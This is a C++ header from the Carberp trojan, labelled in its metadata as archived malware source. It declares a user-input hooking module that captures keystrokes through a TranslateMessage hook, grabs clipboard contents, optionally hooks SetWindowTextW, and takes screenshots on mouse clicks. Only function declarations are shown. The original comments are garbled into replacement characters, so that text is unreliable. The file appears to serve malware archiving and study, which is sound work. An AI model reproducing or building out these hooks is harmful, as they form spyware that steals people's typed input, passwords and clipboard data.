/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
  �������� ����� ������������.
*/
#pragma once

namespace UserHook
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ������� ����������� ��� �����.

    IN clickCount - ���. ������ ��� �������.
    IN filePrefix - ������� ���� ������ �����������. ����� ���� NULL.
  */
  void enableImageOnClick(WORD clicksCount, LPSTR filePrefix);
  
  /*
    ������� ������ ����� ������������.
  */
  void clearInput(void);

  /*
    ��������� ������� ������� �����.

    OUT buffer - �����, ���������� ���������� ����� Mem.

    Return     - 0 - ���� ����� �����, *buffer ����� ����� NULL.
                 >0 - ������ buffer � ��������, �������� ������� ������.
  */
  DWORD getInput(LPWSTR *buffer);
  
  /*
    ����������� TranslateMessage.
  */
  BOOL WINAPI hookerTranslateMessage(const MSG *msg);

  /*
    ����������� GetClipboardData.
  */
  HANDLE WINAPI hookerGetClipboardData(UINT format);

  /*
    ����������� SetWindowTextW.
  */
#if defined HOOKER_SETWINDOWTEXT
  BOOL WINAPI hookerSetWindowTextW(HWND window, const LPWSTR string);
#endif
};
